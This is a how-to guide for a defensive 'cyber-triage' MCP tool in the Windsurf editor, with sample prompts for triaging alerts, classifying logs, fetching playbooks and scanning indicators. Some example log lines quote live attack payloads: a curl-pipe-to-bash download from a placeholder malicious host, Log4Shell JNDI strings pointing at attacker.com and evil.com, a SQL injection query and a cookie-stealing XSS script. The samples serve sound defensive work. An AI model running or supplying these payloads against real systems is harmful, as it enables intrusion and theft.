# How to Use Cyber-Triage MCP in Cascade

After restarting Windsurf, the `cyber-triage` MCP server will be available directly in Cascade chat. You can paste any of these prompts to use the tools.

---

## 🚨 Triage an Alert

**What it does:** Analyzes security alerts, assigns severity (Critical/High/Medium/Low), maps to MITRE ATT&CK techniques, and provides immediate response actions.

**Prompt format:**
```
Use cyber-triage to triage this alert: [paste your alert here]
```

**Examples:**

```
Use cyber-triage to triage this alert: multiple failed SSH login attempts detected on prod-server-01 from IP 185.220.101.47
```

```
Use cyber-triage to triage this alert: ransomware encrypting files on DESKTOP-01
```

```
Use cyber-triage to triage this alert: suspicious PowerShell execution detected - base64 encoded command attempting to download from external IP
```

```
Use cyber-triage to triage this alert: unusual data transfer to mega.nz detected from database server
```

```
Use cyber-triage to triage this alert: lateral movement detected - PSExec used to connect to multiple workstations
```

---

## 📋 Classify a Log Line

**What it does:** Analyzes raw log entries, detects attack patterns (SQL injection, XSS, RCE, brute force, etc.), and provides forensic guidance.

**Prompt format:**
```
Use cyber-triage to classify this log: [paste raw log line]
```

**Examples:**

```
Use cyber-triage to classify this log: Jun 12 03:14:22 web01 sshd[1234]: Failed password for root from 45.33.32.156 port 54321 ssh2
```

```
Use cyber-triage to classify this log: GET /api/users?id=1' union select * from passwords-- HTTP/1.1
```

```
Use cyber-triage to classify this log: Executed: curl http://malicious.com/shell.sh | bash
```

```
Use cyber-triage to classify this log: <script>alert(document.cookie)</script> detected in user input field
```

```
Use cyber-triage to classify this log: ${jndi:ldap://attacker.com/exploit} found in application logs
```

---

## 📖 Get an Incident Response Playbook

**What it does:** Returns step-by-step SOC response procedures for specific incident types, including IOC hunting checklists and escalation criteria.

**Available playbooks:**
- `ransomware` - Ransomware Response
- `phishing` - Phishing Investigation
- `bruteforce` - Brute Force Response
- `dataexfil` - Data Exfiltration Response
- `lateral` - Lateral Movement Response
- `ddos` - DDoS Mitigation
- `insiderthreat` - Insider Threat Investigation
- `webdefacement` - Web Defacement Response

**Prompt format:**
```
Use cyber-triage to get the playbook for [incident_type]
```

**Examples:**

```
Use cyber-triage to get the playbook for ransomware
```

```
Use cyber-triage to get the playbook for phishing
```

```
Use cyber-triage to get the playbook for bruteforce
```

```
Use cyber-triage to get the playbook for dataexfil
```

```
Use cyber-triage to get the playbook for lateral
```

---

## 🔍 Scan an IOC (Indicator of Compromise)

**What it does:** Analyzes IPs, domains, file hashes, URLs, or emails. Returns validation tool recommendations, threat assessment, and response actions. Automatically defangs IOCs for safe sharing.

**Supported IOC types:**
- `ip` - IP addresses
- `domain` - Domain names
- `hash` - File hashes (MD5, SHA1, SHA256)
- `url` - URLs
- `email` - Email addresses

**Prompt format:**
```
Use cyber-triage to scan this [type] IOC: [IOC value]
```

**Examples:**

```
Use cyber-triage to scan this ip IOC: 185.220.101.47
```

```
Use cyber-triage to scan this domain IOC: paypa1-secure-login.com
```

```
Use cyber-triage to scan this hash IOC: 44d88612fea8a8f36de82e1278abb02f
```

```
Use cyber-triage to scan this url IOC: http://malicious-site.com/payload.exe
```

```
Use cyber-triage to scan this email IOC: phishing@suspicious-domain.com
```

---

## 💡 Pro Tips

### Combine Multiple Tools
You can ask Cascade to use multiple tools in sequence:

```
Use cyber-triage to triage this alert: ransomware detected on SERVER-01, then get the ransomware playbook
```

### Ask for Specific Information
```
Use cyber-triage to triage this alert and tell me what MITRE ATT&CK technique this maps to: privilege escalation via sudo exploit
```

### Analyze Real-World Scenarios
```
I just got this SIEM alert: "Unusual outbound traffic to 185.220.101.47 on port 443 from database server". Use cyber-triage to triage it and scan the IP IOC.
```

### Get Contextual Help
```
Use cyber-triage to classify this log and explain what I should do next: ${jndi:ldap://evil.com/a}
```

---

## 🔧 Troubleshooting

**If Cascade says it cannot find the cyber-triage tool:**

1. **Check MCP Settings:**
   - Go to: `Windsurf Settings > MCP`
   - Verify `cyber-triage` appears in the list
   - Check for a green "connected" indicator

2. **Restart Windsurf:**
   - Close Windsurf completely (not just the window)
   - Reopen Windsurf
   - Wait 5-10 seconds for MCP servers to initialize

3. **Verify Config File:**
   - Location: `C:\Users\SAMEER SINGH\AppData\Roaming\Windsurf\mcp_config.json`
   - Should contain the `cyber-triage` server configuration
   - Run `node setup-windsurf-mcp.js` to regenerate if needed

4. **Test Server Manually:**
   ```bash
   node server.js
   # Should print: "Cyber-Defense Triage MCP server running on stdio"
   ```

5. **Run Verification Script:**
   ```bash
   node verify-mcp.js
   # Should complete all tests successfully
   ```

---

## 📚 Additional Resources

- **Full Documentation:** See `README.md` for complete project documentation
- **Web Dashboard:** Run `npm run dashboard` for a visual interface
- **CLI Tool:** Run `npm run cli triage "alert text"` for terminal usage
- **Tests:** Run `npm test` to verify all functionality

---

**Ready to use!** Just restart Windsurf and start asking Cascade to use cyber-triage tools. 🚀
